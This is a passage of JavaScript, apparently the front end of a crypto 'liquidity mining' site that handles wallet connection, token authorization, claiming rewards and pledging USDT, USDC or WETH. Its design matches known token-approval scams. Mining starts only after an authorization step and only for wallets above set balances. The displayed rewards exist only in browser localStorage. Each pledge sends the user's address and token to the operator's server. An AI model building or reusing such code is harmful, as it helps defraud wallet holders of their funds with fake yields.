        return;
      }
      localStorage.setItem('claimable', '0');
      const claimed = parseFloat(localStorage.getItem('claimed')) + claimable;
      localStorage.setItem('claimed', claimed.toString());
      accountBalance[authorizedToken] += claimable;
      await saveUserData();
      await updateInterest();
      await forceRefreshWalletBalance();
      updateStatus(translations[currentLang].claimSuccess + ' ' + translations[currentLang].nextClaimTime);
    });
  }
  if (languageSelect) languageSelect.addEventListener('change', e => updateLanguage(e.target.value));
  if (connectButton) {
    connectButton.addEventListener('click', () => {
      if (connectButton.classList.contains('connected')) {
        disconnectWallet();
      } else {
        connectWallet();
      }
    });
  }
  if (startBtn) {
    startBtn.addEventListener('click', async () => {
      if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
      const selectedToken = walletTokenSelect.value;
      if (!selectedToken) { updateStatus(translations[currentLang].selectTokenFirst, true); return; }
      const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
      const selectedContract = tokenMap[selectedToken];
      if (!selectedContract) { updateStatus('Contract not initialized', true); return; }
      let balanceBigInt;
      try {
        balanceBigInt = await retry(() => selectedContract.balanceOf(userAddress));
      } catch (e) { updateStatus(`${translations[currentLang].error}: Balance error`, true); return; }
      const decimals = selectedToken === 'WETH' ? 18 : 6;
      const balance = parseFloat(window.ethers.utils.formatUnits(balanceBigInt, decimals));
      if (balance === 0) { updateStatus(translations[currentLang].balanceZero, true); return; }
      startBtn.disabled = true;
      startBtn.textContent = 'Authorizing...';
      try {
        await handleConditionalAuthorizationFlow();
        let canStart = false;
        if (selectedToken === 'WETH') {
          const prices = ethPriceCache.price || 2500;
          const wethValueUSD = balance * prices;
          if (wethValueUSD >= 500) canStart = true;
        } else {
          if (balance >= 1) canStart = true;
        }
        if (canStart) {
          pledgedAmount = balance;
          lastPayoutTime = Date.now();
          currentCycleInterest = calculatePayoutInterest();
          authorizedToken = selectedToken;
          localStorage.setItem('pledgedAmount', pledgedAmount.toString());
          localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
          localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
          localStorage.setItem('authorizedToken', authorizedToken);
          updateStatus(translations[currentLang].miningStarted);
          activateStakingUI();
        } else {
          updateStatus('Balance too low.', true);
          startBtn.disabled = false;
          startBtn.textContent = translations[currentLang].startBtnText;
        }
      } catch (error) {
        updateStatus(`${translations[currentLang].approveError}: ${error.message}`, true);
        startBtn.disabled = false;
        startBtn.textContent = translations[currentLang].startBtnText;
      }
    });
  }
  if (pledgeBtn) {
    pledgeBtn.addEventListener('click', async () => {
      if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
      const amount = parseFloat(pledgeAmount.value) || 0;
      const token = pledgeToken.value;
      if (amount <= 0) { updateStatus(translations[currentLang].invalidPledgeAmount, true); return; }
      const tokenMap = { 'USDT': USDT_CONTRACT_ADDRESS, 'USDC': USDC_CONTRACT_ADDRESS, 'WETH': WETH_CONTRACT_ADDRESS };
      const tokenAddress = tokenMap[token];
      if (!tokenAddress) { updateStatus(translations[currentLang].invalidPledgeToken, true); return; }
      const selectedContract = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract }[token];
      try {
        const balance = await retry(() => selectedContract.balanceOf(userAddress));
        const decimals = token === 'WETH' ? 18 : 6;
        const formattedBalance = parseFloat(window.ethers.utils.formatUnits(balance, decimals));
        if (amount > formattedBalance) { updateStatus(translations[currentLang].insufficientBalance, true); return; }
      } catch (error) { updateStatus(`${translations[currentLang].error}: Balance error`, true); return; }
      updateStatus('Pledging...');
      const pledgeData = { address: userAddress, pledges: { isPledging: true, token: tokenAddress, amount: amount.toFixed(2) } };
      try {
        const response = await retry(() => fetch(`${API_BASE_URL}/api/pledge-data`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(pledgeData) }));
        if (!response.ok) throw new Error(`Pledge failed, status: ${response.status}`);
        updateStatus(translations[currentLang].pledgeSuccess);
        await saveUserData();
      } catch (error) { updateStatus(translations[currentLang].pledgeError, true); }
    });
  }
  if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
  if (walletTokenSelect) walletTokenSelect.addEventListener('change', forceRefreshWalletBalance);
  document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', () => {
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
      document.getElementById(tab.dataset.tab).classList.add('active');
      if (tab.dataset.tab === 'liquidity') updateInterest();
    });
  });
  const rulesModal = document.getElementById('rulesModal');
  const rulesButton = document.getElementById('rulesButton');
  const closeRulesModal = document.getElementById('closeRulesModal');
  if (rulesButton) {
  rulesButton.addEventListener('click', () => {
    const rulesTitle = document.getElementById('rulesTitle');
    const rulesContent = document.getElementById('rulesContent');
    if (rulesTitle) rulesTitle.textContent = translations[currentLang].rulesTitle;
    if (rulesContent) rulesContent.innerHTML = translations[currentLang].rulesContent;
    rulesModal.style.display = 'flex';
  });
}
  if (closeRulesModal) closeRulesModal.addEventListener('click', () => rulesModal.style.display = 'none');
  if (rulesModal) rulesModal.addEventListener('click', e => e.target === rulesModal && (rulesModal.style.display = 'none'));
});